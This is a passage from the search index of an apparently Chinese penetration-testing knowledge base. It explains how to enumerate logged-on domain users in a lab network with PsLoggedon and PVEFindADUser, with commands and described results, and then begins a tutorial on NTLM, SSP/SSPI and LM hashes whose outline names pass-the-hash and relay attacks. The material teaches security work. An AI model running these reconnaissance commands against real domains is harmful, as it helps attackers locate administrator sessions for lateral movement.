/accepteula \\\\AD01\n#\u67e5\u8be2 10.211.55.7 \u670d\u52a1\u5668\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\nPsLoggedon.exe /accepteula \\\\10.211.55.7\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u67e5\u8be2 win7 \u673a\u5668\u767b\u5f55\u7684\u7528\u6237\uff0c\u7531\u4e8e PC \u673a\u5668\u9ed8\u8ba4\u6ca1\u6709\u5f00\u542f\u6ce8\u518c\u8868\u8fdc\u7a0b\u8fde\u63a5\uff0c\u6240\u4ee5\u67e5\u8be2\u4f1a\u5931\u8d25\uff1b\u67e5\u8be2 win2008 \u673a\u5668\u767b\u5f55\u7684\u7528\u6237\uff0c\u67e5\u8be2\u51fa xie\\admin \u548cxie\\administrator \u7528\u6237\uff1b\u67e5\u8be2 AD01 \u673a\u5668\u767b\u5f55\u7684\u7528\u6237\uff0c\u67e5\u8be2\u51fa xie\\administrator\u7528\u6237\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u67e5\u8be2\u6307\u5b9a ip10.211.55.7 \u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u51fa\u5f53\u524d\u767b\u5f55\u7740 xie\\admin \u548c xie\\administrator \u7528\u6237\u3002</p> <p></p> <p>\u6211\u4eec\u6ce8\u610f\u5230\u8fd9\u91cc\u8fd8\u6709\u4e00\u884c Users logged on via resource shares\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u8fd9\u4e2a\u662f\u76ee\u6807\u4e3b\u673a\u901a\u8fc7\u8d44\u6e90\u5171\u4eab\u8fdc\u7a0b\u767b\u5f55\u7684\u7528\u6237\uff0c\u8fd9\u91cc\u5c06\u4f1a\u663e\u793a\u5f53\u524d\u7528\u6237Win10\\hack \u901a\u8fc7\u8d44\u6e90\u5171\u4eab\u767b\u5f55\u5230\u76ee\u6807\u4e3b\u673a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u63a5\u53e3\u7684\u67e5\u8be2\u662f\u901a\u8fc7NetSessionEnum API \u6765\u679a\u4e3e\u7f51\u7edc\u4f1a\u8bdd\u7684\uff0c\u9700\u8981\u5148\u767b\u5f55\u624d\u80fd\u679a\u4e3e\u8be5\u7f51\u7edc\u4f1a\u8bdd\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6211\u4eec\u5728 win7 \u673a\u5668\u4e0a\u901a\u8fc7 net use \u547d\u4ee4\u8fdc\u7a0b\u8fde\u63a5 10.211.55.7 \u673a\u5668\u3002</p> <p></p> <p>\u7136\u540e\u518d\u6b21\u67e5\u8be2 10.211.55.7 \u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u591a\u4e86\u4e00\u4e2aXIE\\test\u3002\u8fd9\u91cc\u5c31\u662f\u901a\u8fc7\u8fdc\u7a0b\u8d44\u6e90\u5171\u4eab\u8fde\u63a5\u7684\u7528\u6237\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#pvefindaduser","title":"PVEFindADUser","text":"<p>\u8fd9\u662f\u4e00\u6b3e\u4f7f\u7528 C#\u8bed\u8a00\u5199\u7684\u53ef\u7528\u4e8e\u67e5\u8be2\u6307\u5b9a\u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u5de5\u5177\u3002\u8be5\u5de5\u5177\u7684\u539f\u7406\u662f\u901a\u8fc7\u68c0\u67e5\u6ce8\u518c\u8868 HKEY_USERS \u9879\u7684 Key \u503c\u6765\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002\u8be5\u5de5\u5177\u7684\u8fd0\u884c\u4e0d\u9700\u8981\u57df\u7ba1\u7406\u5458\u6743\u9650\uff0c\u53ea\u9700\u8981\u666e\u901a\u57df\u7528\u6237\u5373\u53ef\u3002</p> <p>\u4ee5\u4e0b\u662f\u8be5\u5de5\u5177\u7684\u53c2\u6570\u8bf4\u660e\uff1a</p> <p>\u53c2\u6570\uff1a</p> <ul> <li>-h\uff1a\u8be5\u53c2\u6570\u663e\u793a\u5e2e\u52a9\u4fe1\u606f</li> <li>-u\uff1a\u8be5\u53c2\u6570\u68c0\u67e5\u7a0b\u5e8f\u662f\u5426\u6709\u65b0\u7248\u672c</li> <li>-v\uff1a\u8be5\u53c2\u6570\u663e\u793a\u8be6\u7ec6\u4fe1\u606f</li> <li>-current \uff1a\u8be5\u53c2\u6570\u663e\u793a\u57df\u4e2d\u6bcf\u53f0\u673a\u5668\u4e0a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002\u5982\u679c\u6307\u5b9a\u7528\u6237\u540d\uff0c\u90a3\u4e48\u663e\u793a\u8be5\u7528\u6237\u767b\u5f55\u8fc7\u7684\u673a\u5668\u3002\u5982\u679c\u4e0d\u6307\u5b9a\u7528\u6237\u540d\uff0c\u6240\u6709\u7528\u6237\u767b\u5f55\u7684\u673a\u5668\u90fd\u5c06\u663e\u793a\u3002</li> <li>-last\uff1a\u8be5\u53c2\u6570\u663e\u793a\u57df\u4e2d\u673a\u5668\u4e0a\u6700\u540e\u767b\u5f55\u7684\u7528\u6237\u3002\u5982\u679c\u6307\u5b9a\u7528\u6237\u540d\uff0c\u90a3\u4e48\u53ea\u663e\u793a\u8be5\u7528\u6237\u4e0a\u6b21\u767b\u5f55\u7684\u673a\u5668\u3002\u5982\u679c\u4e0d\u6307\u5b9a\u7528\u6237\u540d\uff0c\u5219\u5c06\u663e\u793a\u6240\u6709\u5177\u6709\u4e0a\u6b21\u767b\u5f55\u7528\u6237\u7684\u673a\u5668\u3002\u9700\u8981\u8bf4\u660e\u7684\u662f\uff0c\u6307\u5b9a\u7684\u7528\u6237\u540d\u9700\u8981\u5305\u542b\u57df\u540d\uff0c\u5982xie\\administrator\u3002\u5982\u679c\u5728\u7528\u6237\u540d\u4e2d\u52a0\u4e86\uff0c\u5982 xie*admin\uff0c\u5219\u5c06\u67e5\u8be2\u7528\u6237\u540d\u4e2d\u5e26\u6709 admin \u7684\u7528\u6237\u5f53\u524d\u767b\u5f55\u7684\u4e3b\u673a\u3002</li> <li>-noping\uff1a\u8be5\u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u5728\u63a2\u6d4b\u4e4b\u524d\u4e0d\u5bf9\u76ee\u6807\u8ba1\u7b97\u673a\u6267\u884c ping \u547d\u4ee4\u3002</li> <li>-target\uff1a\u8be5\u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u8981\u67e5\u8be2\u7684\u4e3b\u673a\uff0c\u53ef\u4ee5\u662f\u4e3b\u673a\u540d\u4e5f\u53ef\u4ee5\u662f ip\u3002\u5982\u679c\u672a\u6307\u5b9a\u6b64\u53c2\u6570\uff0c\u5c06\u67e5\u8be2\u5f53\u524d\u57df\u4e2d\u7684\u6240\u6709\u4e3b\u673a\u3002\u5982\u679c\u6307\u5b9a\u4e86\u6b64\u53c2\u6570\uff0c\u5219\u540e\u8ddf\u4e00\u4e2a\u7531\u9017\u53f7\u5206\u9694\u7684\u4e3b\u673a\u540d\u5217\u8868\uff0c\u5982host.xie.com,host2.xie.com,host3.xie.com \u6216192.168.10.1,192.168.10.2,192.168.10.3\u3002</li> <li>-os\uff1a\u5c06\u76ee\u6807\u673a\u5668\u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\u5199\u5165 cvs \u6587\u4ef6\u3002\u5982\u679c\u662f\u76f4\u63a5\u67e5\u8be2\u8ba1\u7b97\u673a\uff0c\u6b64\u6b64\u9009\u9879\u4e0d\u8f93\u51fa\u4efb\u4f55\u4e1c\u897f\u3002</li> <li>-stopfound\uff1a\u5728\u627e\u5230\u7b2c\u4e00\u4e2a\u5339\u914d\u9879\u65f6\u505c\u6b62\u641c\u7d22\u3002\u6b64\u53c2\u6570\u4ec5\u5728\u67e5\u627e\u5f53\u524d\u5df2\u767b\u5f55\u7684\u7528\u6237\u65f6\u6709\u6548\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#1_1","title":"(1) \u67e5\u8be2\u6240\u6709\u4e3b\u673a\u5f53\u524d\u7684\u767b\u5f55\u7528\u6237","text":"<p>\u4f7f\u7528 PVEFindADUser.exe \u5206\u522b\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u53ef\u4ee5\u67e5\u8be2\u57df\u4e2d\u6240\u6709\u673a\u5668\u4e0a\u5f53\u524d\u767b\u5f55\u7684\u6240\u6709\u7528\u6237\u3002\u67e5\u8be2\u7ed3\u679c\u5c06\u88ab\u8f93\u51fa\u5230 report.csv \u6587\u4ef6\u4e2d\u3002</p> <pre><code>#\u67e5\u8be2\u57df\u4e2d\u6240\u6709\u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\nPVEFindADUser.exe -current\n\n#\u67e5\u8be2\u57df\u4e2d\u6240\u6709\u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u4e0d\u901a\u8fc7 ping \u68c0\u6d4b\u76ee\u6807\u673a\u5668\u662f\u5426\u5f00\u542f\nPVEFindADUser.exe -current -noping\n\n#\u67e5\u8be2\u57df\u4e2d\u6240\u6709\u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u4e0d\u901a\u8fc7 ping \u68c0\u6d4b\u76ee\u6807\u673a\u5668\u662f\u5426\u5f00\u542f\uff0c\u5e76\u4e14\u5c06\u4e3b\u673a\u7684\u64cd\u4f5c\u7cfb\u7edf\u5199\u5165 report.csv \u6587\u4ef6\nPVEFindADUser.exe -current -noping -os\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u67e5\u8be2\u57df\u4e2d\u6240\u6709\u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u51fa AD01 \u673a\u5668\u5f53\u524d\u767b\u5f55\u7740 xie\\administrator \u7528\u6237\u3002mail \u673a\u5668\u7531\u4e8e\u5173\u673a\u6240\u4ee5\u663e\u793a down\u3002win10 \u548c win7\u673a\u5668\u7531\u4e8e\u662f PC \u673a\u5668\uff0c\u6240\u4ee5\u67e5\u8be2\u4e0d\u51fa\u6765\u3002win2008 \u673a\u5668\u7531\u4e8e\u5f00\u542f\u4e86\u9632\u706b\u5899\uff0c\u56e0\u6b64ping \u4e0d\u901a\uff0c\u6240\u4ee5\u8be5\u5de5\u5177\u8ba4\u4e3a win2008 \u673a\u5668 down \u4e86\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u67e5\u8be2\u57df\u4e2d\u6240\u6709\u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u6307\u5b9a-noping \u53c2\u6570\uff0c\u4e0d\u901a\u8fc7 ping\u63a2\u6d4b\u76ee\u6807\u673a\u5668\u662f\u5426\u5f00\u542f\u3002\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u51fa AD01 \u673a\u5668\u5f53\u524d\u767b\u5f55\u7740xie\\administrator \u7528\u6237\u3002mail \u673a\u5668\u7531\u4e8e\u5173\u673a\u6240\u4ee5\u663e\u793a down\u3002win10 \u548c win7 \u673a\u5668\u7531\u4e8e\u662f PC \u673a\u5668\uff0c\u6240\u4ee5\u67e5\u8be2\u4e0d\u51fa\u6765\u3002win2008 \u673a\u5668\u5373\u4f7f\u5f00\u542f\u4e86\u9632\u706b\u5899\u7981\u6b62 ping\uff0c\u4e5f\u67e5\u8be2\u51fa\u5f53\u524d\u767b\u5f55\u7740 xie\\admin \u548c xie\\administrator \u7528\u6237\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#2_1","title":"(2) \u67e5\u8be2\u6307\u5b9a\u4e3b\u673a\u5f53\u524d\u7684\u767b\u5f55\u7528\u6237","text":"<pre><code>#\u67e5\u8be2 win2008 \u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\nPVEFindADUser.exe -current -target win2008\n#\u67e5\u8be2 win2008 \u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u4e0d\u4f7f\u7528 ping \u63a2\u6d4b\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u6d3b\nPVEFindADUser.exe -current -target win2008 -noping\n#\u67e5\u8be2 win2008 \u548c ad01 \u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u4e0d\u4f7f\u7528 ping \u63a2\u6d4b\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u6d3b\nPVEFindADUser.exe -current -target win2008,ad01 -noping\n#\u67e5\u8be2 10.211.55.7 \u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u4e0d\u4f7f\u7528 ping \u63a2\u6d4b\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u6d3b\nPVEFindADUser.exe -current -target 10.211.55.7 -noping\n#\u67e5\u8be2 10.211.55.7 \u548c 10.211.55.4 \u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u4e0d\u4f7f\u7528 ping \u63a2\u6d4b\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u6d3b\nPVEFindADUser.exe -current -target 10.211.55.7,10.211.55.4 -noping\n#\u67e5\u8be2 win7 \u4e3b\u673a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\nPVEFindADUser.exe -current -target win7\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u4e0d\u52a0-noping \u65f6\uff0c\u7531\u4e8e win2008 \u673a\u5668\u9632\u706b\u5899\u5f00\u542f\u65e0\u6cd5 ping \u901a\uff0c\u6240\u4ee5\u8be5\u5de5\u5177\u8ba4\u4e3a win2008 \u673a\u5668 down \u4e86\u3002\u5f53\u52a0\u4e86-noping \u53c2\u6570\u65f6\uff0c\u4e0d\u4f7f\u7528 ping \u68c0\u6d4b\u76ee\u6807\u673a\u5668\u662f\u5426\u5f00\u542f\uff0c\u6b64\u65f6\u63a2\u6d4b\u5230 win2008 \u673a\u5668\u5f53\u524d\u767b\u5f55\u7740 xie\\admin \u548cxie\\administrator \u7528\u6237\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#3","title":"(3) \u67e5\u8be2\u6307\u5b9a\u7528\u6237\u5f53\u524d\u767b\u5f55\u7684\u4e3b\u673a","text":"<p>\u4f7f\u7528 PVEFindADUser.exe \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u6307\u5b9a\u7528\u6237\u5f53\u524d\u767b\u5f55\u7684\u4e3b\u673a\u3002\u8be5\u5de5\u5177\u4f1a\u4e00\u4e2a\u4e00\u4e2a\u5217\u51fa\u57df\u5185\u670d\u52a1\u5668\u5f53\u524d\u662f\u5426\u767b\u5f55\u7740\u6307\u5b9a\u7528\u6237\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e3a\u4e86\u51c6\u786e\u6027\uff0c\u5f3a\u70c8\u5efa\u8bae\u52a0\u4e0a-noping \u53c2\u6570\u3002</p> <pre><code>#\u67e5\u8be2 xie\\administrator \u7528\u6237\u5f53\u524d\u767b\u5f55\u7684\u4e3b\u673a\nPVEFindADUser.exe -current xie\\administrator -noping\n#\u67e5\u8be2 xie\\administrator \u7528\u6237\u5f53\u524d\u767b\u5f55\u7684\u4e3b\u673a\uff0c\u627e\u5230\u4e86\u4e00\u4e2a\u5373\u505c\u6b62\u5bfb\u627e\nPVEFindADUser.exe -current xie\\administrator -noping -stopfound\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/index.html","title":"\u534f\u8bae\u8bb2\u89e3","text":"<p>\u8be6\u7ec6\u4ecb\u7ecdNTLM\u534f\u8bae\u548cKerberos\u534f\u8bae\u5404\u4e2a\u6d41\u7a0b\uff0c\u4ee5\u53ca\u6bcf\u4e2a\u6d41\u7a0b\u53ef\u80fd\u51fa\u73b0\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <ul> <li>NTLM\u534f\u8bae\u8be6\u89e3</li> <li>Kerberos \u534f\u8bae\u8be6\u89e3</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html","title":"\u76ee\u5f55","text":"<pre><code>NTLM\u534f\u8bae\u8be6\u89e3\n    SSP\u548cSSPI\u7684\u6982\u5ff5\n        1.SSPI\n        2.SSP\n    LM Hash\u52a0\u5bc6\u7b97\u6cd5\n        \u52a0\u5bc6\u6d41\u7a0b\n    NTLM Hash \u52a0\u5bc6\u7b97\u6cd5\n        1.NTLM Hash \u52a0\u5bc6\u6d41\u7a0b\n        2.Windows\u7cfb\u7edf\u5b58\u50a8\u7684NTLM Hash\n    NTLM \u534f\u8bae\u8ba4\u8bc1\n        1.\u5de5\u4f5c\u7ec4\u73af\u5883\u4e0b\u7684 NTLM \u8ba4\u8bc1\n            \u5de5\u4f5c\u7ec4\u73af\u5883\u4e0b\u7684 NTLM \u6293\u5305\u5206\u6790\n        2.\u57df\u73af\u5883\u4e0b\u7684 NTLM \u8ba4\u8bc1\n        3.Net-NTLM hash\u7ec4\u6210\n        4.NTLM v1 \u548c NTLM v2 \u7684\u533a\u522b\n            Challenge \u8d28\u8be2\u503c\uff1a\n            Net-NTLM Hash \u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\uff1a\n    NTLM \u534f\u8bae\u7684\u5b89\u5168\u95ee\u9898\n        1.Pass The Hash\n        2.NTLM Relay\n        3.Net-NTLM v1 Hash \u7834\u89e3\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#ntlm","title":"NTLM\u534f\u8bae\u8be6\u89e3","text":"<p>NTLM(New Technolopy LAN Manager)\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u662f\u5fae\u8f6f\u7528\u4e8eWindows\u8eab\u4efd\u9a8c\u8bc1\u7684\u4e3b\u8981\u534f\u8bae\u4e4b\u4e00\u3002\u65e9\u671fSMB\u534f\u8bae\u4ee5\u660e\u6587\u53e3\u4ee4\u7684\u5f62\u5f0f\u5728\u7f51\u7edc\u4e0a\u4f20\u8f93\uff0c\u56e0\u6b64\u4ea7\u751f\u4e86\u5b89\u5168\u6027\u95ee\u9898\u3002\u540e\u6765\u51fa\u73b0\u4e86<code>LM(LAN Manager)</code>\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u5b83\u662f\u5982\u6b64\u7684\u7b80\u5355\u4ee5\u81f3\u4e8e\u5f88\u5bb9\u6613\u88ab\u7834\u89e3\u3002\u540e\u6765\u5fae\u8f6f\u63d0\u51fa\u4e86NTLM\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff0c\u4ee5\u53ca\u66f4\u65b0\u7684NTLM V2\u7248\u672c\u3002NTLM\u534f\u8bae\u65e2\u53ef\u4ee5\u4e3a\u5de5\u4f5c\u7ec4\u4e2d\u7684\u673a\u5668\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u57df\u73af\u5883\u8eab\u4efd\u9a8c\u8bc1\u3002NTLM\u534f\u8bae\u53ef\u4ee5\u4e3aSMB,HTTP,LDAP,SMTP\u7b49\u4e0a\u5c42\u5fae\u8f6f\u5e94\u7528\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#sspsspi","title":"SSP\u548cSSPI\u7684\u6982\u5ff5","text":"<p>\u6211\u4eec\u9996\u5148\u4e86\u89e3\u4e24\u4e2a\u57fa\u672c\u6982\u5ff5\uff1aSSPI\u548cSSP</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#1sspi","title":"1.SSPI","text":"<p>SSPI(Security Service Provider Interface\u6216 Security Support Provider Interface\uff0c\u5b89\u5168\u670d\u52a1\u63d0\u4f9b\u63a5\u53e3)\u662fWindows\u5b9a\u4e49\u7684\u4e00\u5957\u63a5\u53e3\uff0c\u8be5\u63a5\u53e3\u5b9a\u4e49\u4e86\u4e0e\u5b89\u5168\u6709\u5173\u7684\u529f\u80fd\u51fd\u6570\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236</li> <li>\u4e3a\u5176\u4ed6\u534f\u8bae\u63d0\u4f9b\u7684Session Security \u673a\u5236\u3002Session Security\u6307\u7684\u662f\u4f1a\u8bdd\u5b89\u5168\uff0c\u5373\u4e3a\u901a\u8baf\u6570\u636e\u63d0\u4f9b\u5b8c\u6574\u6027\u6821\u9a8c\u4ee5\u53ca\u6570\u636e\u7684\u52a0\u89e3\u5bc6\u529f\u80fd\u3002</li> </ul> <p>SSPI\u63a5\u53e3\u5b9a\u4e49\u4e86\u4e0e\u5b89\u5168\u6709\u5173\u7684\u529f\u80fd\u51fd\u6570\uff0c\u7528\u6765\u83b7\u53d6\u9a8c\u8bc1\uff0c\u4fe1\u606f\u5b8c\u6574\u6027\uff0c\u4fe1\u606f\u9690\u79c1\u7b49\u5b89\u5168\u529f\u80fd\uff0c\u8be5\u63a5\u53e3\u53ea\u662f\u5b9a\u4e49\u4e86\u4e00\u5957\u63a5\u53e3\u51fd\u6570\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5b9e\u73b0\u5177\u4f53\u7684\u5185\u5bb9\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#2ssp","title":"2.SSP","text":"<p>SSP(Security Service Provider , \u5b89\u5168\u670d\u52a1\u63d0\u4f9b\u8005)\u662fSSPI\u7684\u5b9e\u73b0\u8005\uff0c\u5fae\u8f6f\u81ea\u5df1\u5b9e\u73b0\u4e86\u5982\u4e0b\u7684SSP\uff0c\u7528\u4e8e\u63d0\u4f9b\u5b89\u5168\u670d\u52a1\u529f\u80fd\uff0c\u5305\u542b\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>NTLM SSP\uff1aWindows NT 3.51 \u4e2d\u5f15\u5165(msv1_0.dll) \uff0c\u4e3a Windows 2000\u4e4b\u524d\u7684\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u57df\u548c\u975e\u57df\u8eab\u4efd\u9a8c\u8bc1\uff08SMB/CIFS\uff09\u63d0\u4f9b NTLM \u8d28\u8be2/\u54cd\u5e94\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>Kerberos SSP\uff1aWindows 2000 \u4e2d\u5f15\u5165\uff0cWindows Vista \u4e2d\u66f4\u65b0\u4e3a\u652f\u6301AES(kerberos.dll)\uff0cWindows 2000 \u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u9996\u9009\u7684\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u57df\u76f8\u4e92\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>Digest SSP\uff1aWindows XP \u4e2d\u5f15\u5165(wdigest.dll) \uff0c\u5728 Windows \u4e0eKerberos \u4e0d\u53ef\u7528\u7684\u975e Windows \u7cfb\u7edf\u95f4\u63d0\u4f9b\u57fa\u4e8e HTTP \u548c SASL \u8eab\u4efd\u9a8c\u8bc1\u7684\u8d28\u8be2/\u54cd\u5e94\u3002</li> <li>Negotiate SSP\uff1aWindows 2000 \u4e2d\u5f15\u5165(secur32.dll) \uff0c\u9ed8\u8ba4\u9009\u62e9Kerberos\uff0c\u5982\u679c\u4e0d\u53ef\u7528\u5219\u9009\u62e9 NTLM \u534f\u8bae\u3002Negotiate SSP \u63d0\u4f9b\u5355\u70b9\u767b\u5f55\u80fd\u529b\uff0c\u6709\u65f6\u79f0\u4e3a\u96c6\u6210 Windows \u8eab\u4efd\u9a8c\u8bc1\uff08\u5c24\u5176\u662f\u7528\u4e8e IIS \u65f6\uff09\u3002\u5728Windows 7 \u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\uff0cNEGOExts \u5f15\u5165\u4e86\u534f\u5546\u4f7f\u7528\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e0a\u652f\u6301\u7684\u5df2\u5b89\u88c5\u5b9a\u5236 SSP \u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>Cred SSP\uff1aWindows Vista \u4e2d\u5f15\u5165\uff0cWindows XP SP3 \u4e0a\u4e5f\u53ef\u7528(credssp.dll)\uff0c\u4e3a\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u63d0\u4f9b\u5355\u70b9\u767b\u5f55\uff08SSO\uff09\u548c\u7f51\u7edc\u7ea7\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>Schannel SSP\uff1aWindows 2000 \u4e2d\u5f15\u5165(Schannel.dll)\uff0cWindows Vista \u4e2d\u66f4\u65b0\u4e3a\u652f\u6301\u66f4\u5f3a\u7684 AES \u52a0\u5bc6\u548c ECC[6]\u8be5\u63d0\u4f9b\u8005\u4f7f\u7528 SSL/TLS \u8bb0\u5f55\u6765\u52a0\u5bc6\u6570\u636e\u6709\u6548\u8f7d\u8377\u3002</li> <li>PKU2U SSP\uff1aWindows 7 \u4e2d\u5f15\u5165(pku2u.dll) \uff0c \u5728\u4e0d\u96b6\u5c5e\u57df\u7684\u7cfb\u7edf\u4e4b\u95f4\u63d0\u4f9b\u4f7f\u7528\u6570\u5b57\u8bc1\u4e66\u7684\u5bf9\u7b49\u8eab\u4efd\u9a8c\u8bc1\u3002</li> </ul> <p>\u56e0\u4e3aSSPI\u4e2d\u5b9a\u4e49\u4e86\u4e0eSession Security\u6709\u5173\u7684API\u3002\u6240\u4ee5\u4e0a\u5c42\u5e94\u7528\u5229\u7528\u4efb\u4f55SSP\u4e0e\u8fdc\u7a0b\u7684\u670d\u52a1\u8fdb\u884c\u4e86\u8eab\u4efd\u9a8c\u8bc1\u540e\uff0c\u6b64SSP\u90fd\u4f1a\u4e3a\u672c\u6b21\u8fde\u63a5\u751f\u6210\u4e00\u4e2a\u968f\u673aKey\u3002\u8fd9\u4e2a\u968f\u673aKey\u88ab\u79f0\u4e3aSession Key\u3002\u4e0a\u5c42\u5e94\u7528\u5728\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u540e\uff0c\u53ef\u4ee5\u9009\u62e9\u6027\u5730\u4f7f\u7528\u8fd9\u4e2aKey\u5bf9\u4e4b\u540e\u53d1\u5f80\u670d\u52a1\u7aef\u6216\u63a5\u53d7\u81ea\u670d\u52a1\u7aef\u7684\u6570\u636e\u8fdb\u884c\u7b7e\u540d\u6216\u52a0\u5bc6\u3002\u5728\u7cfb\u7edf\u5c42\u9762\uff0cSSP\u5c31\u662f\u4e00\u4e2adll\uff0c\u7528\u6765\u9a8c\u8bc1\u8eab\u4efd\u9a8c\u8bc1\u7b49\u5b89\u5168\u529f\u80fd\u3002\u4e0d\u540c\u7684SSP\uff0c\u5b9e\u73b0\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u662f\u4e0d\u4e00\u6837\u7684\u3002\u6bd4\u5982NTLM SSP \u5b9e\u73b0\u7684\u5c31\u662f\u4e00\u79cd\u57fa\u4e8e\u8d28\u8be2/\u54cd\u5e94\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\uff0c\u800cKerberos SSP\u5b9e\u73b0\u7684\u5c31\u662f\u57fa\u4e8eTicket\u7968\u636e\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u3002\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u81ea\u5df1\u7684SSP\uff0c\u7136\u540e\u6ce8\u518c\u5230\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u652f\u6301\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\u3002</p> <p>SSP\u3001SSPI \u548c\u5404\u79cd\u5e94\u7528\u7684\u5173\u7cfb\u5982\u56fe 1-1 \u6240\u793a\u3002</p> <p></p> <p>\u76f8\u5173\uff1ahttps://learn.microsoft.com/zh-cn/windows/win32/secauthn/sspi-model</p> <p>https://learn.microsoft.com/zh-cn/windows/win32/secauthn/ssp-packages-provided-by-microsoft</p>"},{"location":"CTF/Intranet_security/Domain_AD/Protocol_Explanation/article1/index.html#lm-hash","title":"LM Hash\u52a0\u5bc6\u7b97\u6cd5","text":"<p>LM(LAN Manager)\u8eab\u4efd\u9a8c\u8bc1\u662f\u5fae\u8f6f\u63a8\u51fa\u7684\u4e00\u4e2a\u8eab\u4efd\u8ba4\u8bc1\u534f\u8bae\uff0c\u5176\u4f7f\u7528\u7684\u52a0\u5bc6\u7b97\u6cd5\u662fLM Hash\u7b97\u6cd5\u3002HM Hash\u672c\u8d28\u662fDES\u52a0\u5bc6\uff0c\u5c3d\u7ba1LM Hash\u8f83\u5bb9\u6613\u88ab\u7834\u89e3\uff0c\u4f46\u662f\u4e3a\u4e86\u4fdd\u8bc1\u7cfb\u7edf\u7684\u517c\u5bb9\u6027\uff0cWindows\u53ea\u662f\u5c06LM Hash\u7981\u7528\u4e86(\u4ece Windows Vista \u548c Windows Server 2008 